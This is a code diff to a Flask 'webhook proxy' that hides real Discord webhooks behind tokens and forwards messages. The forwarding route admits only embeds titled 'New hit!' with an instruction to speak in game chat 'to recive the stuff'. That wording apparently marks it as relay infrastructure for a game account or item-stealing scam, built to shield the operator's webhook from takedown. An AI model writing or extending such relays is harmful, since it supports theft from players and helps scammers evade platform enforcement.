@@ -5,9 +5,9 @@ import requests, time, string, random, os
 app = Flask(__name__)
 CORS(app)
 
-webhook_map = {}
-ip_registry = {}
-LIMIT_SECONDS = 3600
+webhook_map = {}  # token -> Discord webhook
+ip_registry = {}  # token+IP -> last request timestamp
+LIMIT_SECONDS = 3600  # 1 webhook per hour per IP
 
 def generate_token(length=6):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -16,10 +16,8 @@ def generate_token(length=6):
 def home():
     return """
     <h1>✅ Webhook Proxy is Running</h1>
-    <p>Use the <code>/create</code> endpoint to generate a proxy webhook.</p>
-    <p><b>POST</b> your real Discord webhook to <code>/create</code> using JSON:<br>
-    <code>{ "real_webhook": "https://discord.com/api/webhooks/..." }</code></p>
-    <p>Then use the returned <code>/webhook/&lt;token&gt;</code> URL to send messages!</p>
+    <p>Use <code>/create</code> to register a Discord webhook.</p>
+    <p>Then use the returned proxy URL to send validated messages.</p>
     """
 
 @app.route("/create", methods=["POST"])
@@ -52,8 +50,9 @@ def handle_webhook(token):
 
     data = request.json
     if not data or "embeds" not in data:
-        return jsonify({"error": "Missing 'embeds'"}), 400
+        return jsonify({"error": "Missing or invalid 'embeds'"}), 400
 
+    # Embed content check
     allowed = False
     for embed in data["embeds"]:
         if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
@@ -65,11 +64,10 @@ def handle_webhook(token):
                         break
 
     if not allowed:
-        return jsonify({"error": "Invalid embed structure or content"}), 400
+        return jsonify({"error": "Embed content not allowed"}), 400
 
     ip_registry[key] = time.time()
-    real_webhook = webhook_map[token]
-    response = requests.post(real_webhook, json=data)
+    response = requests.post(webhook_map[token], json=data)
 
     return jsonify({
         "status": "sent",
@@ -77,5 +75,5 @@ def handle_webhook(token):
     })
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
+    port = int(os.environ.get("PORT", 10000))  # Render uses dynamic port
     app.run(host="0.0.0.0", port=port)
